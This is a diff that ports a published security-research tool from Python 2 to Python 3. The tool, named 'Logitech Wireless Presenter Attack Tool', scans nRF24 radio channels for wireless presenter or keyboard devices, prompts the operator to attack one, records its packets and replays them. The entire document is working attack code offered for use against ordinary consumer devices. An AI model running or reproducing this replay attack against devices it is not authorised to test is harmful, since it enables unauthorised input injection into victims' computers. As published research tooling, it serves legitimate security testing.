@@ -1,4 +1,4 @@
-#!/usr/bin/env python2
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
 
 """
@@ -23,32 +23,43 @@
 
   You should have received a copy of the GNU General Public License
   along with this program.  If not, see <http://www.gnu.org/licenses/>.
+  
+  Einstein2150 (Update 2024):
+  This program has been migrated and further developed for use with
+  Python 3 by Einstein2150. The author acknowledges that ongoing
+  enhancements and updates to the codebase may continue in the future.
+  Users should be aware that the use of this program is at their own
+  risk, and the author accepts no responsibility for any damages that
+  may arise from its use. It is the user's responsibility to ensure 
+  that their use of the program complies with all applicable laws 
+  and regulations.
+  
 """
 
-__version__ = '0.2'
-__author__ = 'Matthias Deeg'
+__version__ = '0.3'
+__author__ = 'Einstein2150'
 
 import argparse
 from binascii import hexlify, unhexlify
 from lib import nrf24
 from time import sleep, time
 
-SCAN_CHANNELS   = range(2, 84)              # channels to scan
-DWELL_TIME      = 0.05                      # dwell time for each channel in seconds
-
+SCAN_CHANNELS = list(range(2, 84))             # channels to scan
+DWELL_TIME = 0.05                              # dwell time for each channel in seconds
 
 def banner():
     """Show a fancy banner"""
 
     print("        _____  ______ ___  _  _     _____  _                      _  \n"
-"       |  __ \\|  ____|__ \\| || |   |  __ \\| |                    | |     \n"
-"  _ __ | |__) | |__     ) | || |_  | |__) | | __ _ _   _ ___  ___| |_       \n"
-" | '_ \\|  _  /|  __|   / /|__   _| |  ___/| |/ _` | | | / __|/ _ \\ __|    \n"
-" | | | | | \\ \\| |     / /_   | |   | |    | | (_| | |_| \\__ \\  __/ |_   \n"
-" |_| |_|_|  \\_\\_|    |____|  |_|   |_|    |_|\\__,_|\\__, |___/\\___|\\__|\n"
-"                                                    __/ |             \n"
-"                                                   |___/              \n"
-"Simple Replay Tool v{0} by Matthias Deeg - SySS GmbH (c) 2016".format(__version__))
+          "       |  __ \\|  ____|__ \\| || |   |  __ \\| |                    | |     \n"
+          "  _ __ | |__) | |__     ) | || |_  | |__) | | __ _ _   _ ___  ___| |_       \n"
+          " | '_ \\|  _  /|  __|   / /|__   _| |  ___/| |/ _` | | | / __|/ _ \\ __|    \n"
+          " | | | | | \\ \\| |     / /_   | |   | |    | | (_| | |_| \\__ \\  __/ |_   \n"
+          " |_| |_|_|  \\_\\_|    |____|  |_|   |_|    |_|\\__,_|\\__, |___/\\___|\\__|\n"
+          "                                                    __/ |             \n"
+          "                                                   |___/              \n"
+        "Logitech Wireless Presenter Attack Tool v{0} by Matthias Deeg - SySS GmbH (c) 2016\n"
+        "optimized for use with Python 3 by Einstein2150 (2024)\n".format(__version__))
 
 # main program
 if __name__ == '__main__':
@@ -58,7 +69,7 @@ if __name__ == '__main__':
     # init argument parser
     parser = argparse.ArgumentParser()
     parser.add_argument('-a', '--address', type=str, help='Address of nRF24 device')
-    parser.add_argument('-c', '--channels', type=int, nargs='+', help='ShockBurst RF channel', default=range(2, 84), metavar='N')
+    parser.add_argument('-c', '--channels', type=int, nargs='+', help='ShockBurst RF channel', default=list(range(2, 84)), metavar='N')
 
     # parse arguments
     args = parser.parse_args()
@@ -69,13 +80,13 @@ if __name__ == '__main__':
     if args.address:
         try:
             # address of nRF24 keyboard (CAUTION: Reversed byte order compared to sniffer tools!)
-            address = args.address.replace(':', '').decode('hex')[::-1][:5]
-            address_string = ':'.join('{:02X}'.format(ord(b)) for b in address[::-1])
-        except:
+            address = bytes.fromhex(args.address.replace(':', ''))[::-1][:5]
+            address_string = ':'.join('{:02X}'.format(b) for b in address[::-1])
+        except ValueError:
             print("[-] Error: Invalid address")
             exit(1)
     else:
-        address = ""
+        address = b""
 
     try:
         # initialize radio
@@ -84,7 +95,7 @@ if __name__ == '__main__':
 
         # enable LNA
         radio.enable_lna()
-    except:
+    except Exception:
         print("[-] Error: Could not initialize nRF24 radio")
         exit(1)
 
@@ -105,7 +116,7 @@ if __name__ == '__main__':
     while True:
         # increment the channel
         if len(SCAN_CHANNELS) > 1 and time() - last_tune > DWELL_TIME:
-            channel_index = (channel_index + 1) % (len(SCAN_CHANNELS))
+            channel_index = (channel_index + 1) % len(SCAN_CHANNELS)
             radio.set_channel(SCAN_CHANNELS[channel_index])
             last_tune = time()
 
@@ -113,21 +124,20 @@ if __name__ == '__main__':
         value = radio.receive_payload()
         if len(value) >= 10:
             # split the address and payload
-            address, payload = value[0:5], value[5:]
+            address, payload = value[:5], value[5:]
 
             # show packet payload
-            print("[+] Received data: {0}".format(hexlify(payload)))
+            print("[+] Received data: {0}".format(hexlify(payload).decode()))
             payloads.append(payload)
 
             # convert address to string and reverse byte order
-            converted_address = address[::-1].tostring()
-            address_string = ':'.join('{:02X}'.format(b) for b in address)
+            address_string = ':'.join('{:02X}'.format(b) for b in address[::-1])
             print("[+] Found nRF24 device with address {0} on channel {1}".format(address_string, SCAN_CHANNELS[channel_index]))
 
             # ask user about device
             if not args.address:
-                answer = raw_input("[?] Attack this device (y/n)? ")
-                if answer[0] == 'y':
+                answer = input("[?] Attack this device (y/n)? ")
+                if answer.lower().startswith('y'):
                     break
                 else:
                     print("[*] Continue scanning ...")
@@ -135,7 +145,7 @@ if __name__ == '__main__':
                 break
 
     # put the radio in sniffer mode (ESB w/o auto ACKs)
-    radio.enter_sniffer_mode(converted_address)
+    radio.enter_sniffer_mode(address[::-1])
 
     # if a specific address was given, also replay the read packets during scanning
     if args.address:
@@ -160,7 +170,7 @@ if __name__ == '__main__':
                 packets.append(payload)
 
                 # show packet payload
-                print("[+] Received data: {0}".format(hexlify(payload)))
+                print("[+] Received data: {0}".format(hexlify(payload).decode()))
 
         except KeyboardInterrupt:
             print("\n[*] Stop recording")
@@ -173,15 +183,14 @@ if __name__ == '__main__':
     replaying = True
     while replaying:
         try:
-            key = raw_input("[*] Press <ENTER> to replay the recorded data packets or <CTRL+C> to quit ...")
+            input("[*] Press <ENTER> to replay the recorded data packets or <CTRL+C> to quit ...")
 
             for p in packet_list:
-                print("[+] Send data: {0}".format(hexlify(p)))
-                radio.transmit_payload(p.tostring())
+                print("[+] Send data: {0}".format(hexlify(p).decode()))
+                radio.transmit_payload(p)
 
         except KeyboardInterrupt:
             print("\n[*] Stop replaying")
             replaying = False
 
     print("[*] Done.")
-
